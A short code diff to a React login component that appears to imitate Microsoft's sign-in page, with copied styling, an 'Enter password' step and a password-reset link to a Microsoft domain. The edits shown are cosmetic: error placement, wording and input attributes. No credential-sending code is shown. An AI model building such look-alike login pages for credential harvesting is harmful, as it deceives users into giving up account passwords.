@@ -66,7 +66,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
     try {
       // Validate password
       if (!password) {
-        setError("Please enter your password");
+        setError("Please enter your password.");
         setIsLoading(false);
         return;
       }
@@ -204,7 +204,7 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
                 Enter password
               </h2>
             </div>
-
+            {error && <div className="text-[#E81123] text-[15px]">{error}</div>}
             <form onSubmit={handlePasswordSubmit} className="">
               <div>
                 <input
@@ -213,14 +213,10 @@ export default function LoginPhase({ phase, setPhase }: LoginPhaseProps) {
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   placeholder="Password"
-                  required
                   autoFocus
-                  suppressHydrationWarning={true}
                   className="w-full py-1.5 pr-2.5 border-b border-[#1b1b1b] outline-none text-[#1b1b1b] text-[15px] font-normal"
                 />
               </div>
-
-              {error && <div className="text-red-600 text-[13px]">{error}</div>}
 
               <div className="text-[13px] mt-4">
                 <a href={`https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZHNa9NgAIeTdqu1oOsmyA6KPUwZm0mTNGmawpAu65rG9XNt2hRU0jdv1rfL15LU2p48DryIIqgHwZ1kBxme1JPgbacdPIgnD4IyBEUQdhGsf4Hw8Ls_zy8WYcgUT9JLYYaksgsZwAlQ03lC56kUwWoMTwiQ4wggpDWK4liQ0RlvLhbf-Tq_uPf7ZumNWHq_9OQasY8nekHg-tlk0hppADgDOyAtBDzHd4yABI6VfI3jRzi-H1qguxzLsaxGAJ5lCVandCKjCYAQeMMAaZqFAsV_Cs1UcoOgx_wbx0Nj-CsUNTxty4J28DTswpHsdsRiuthXkNpQ-uq4OdxoqFy5UAzKhbJVHlGs2qhbG40aozZkszzeZkpMjS1vFv2iRZt6IY8qto-0Fkd12nJPTdXdLsM1YXvVLPYdBCxlW2vLppqqIaNNrbwKRyYOlmMfhi86LrSRnnA9x0AmTDiGYSIb3ppYQ9__GMaPpvDjqfPRUPzyPJ7AFq9Q4Ww0Gotj81gCO5nC96Yn_f5cEKsPFu4WHsJLL59pN7DD6aTZql_nSrzuVquluitsbW0Gw1GmSY8lqbJudZU1o6MOKoIko9yKkKW_TeP3IxPOHUZmLF8zyb5Pdj1n6EPvZwTfPYW9Pf3fSx7H8P3Ysm2JOVsRmykhxyt2phkMenfYQU1Zze2sDyXdQyItSDqVH4vbBzH83Rns5OyH7y-e3_vy6Id0PHMVjGrdFuxUK3Ijd3uQX2tqq25rWECKYy5bQOkIss7meSlNr4GVgzj2ecIsdjKb2J3D_gI1&mkt=en-US&hosted=0&device_platform=Windows+10&username=${encodeURIComponent(email)}`} className="text-[#0067BB] hover:underline">
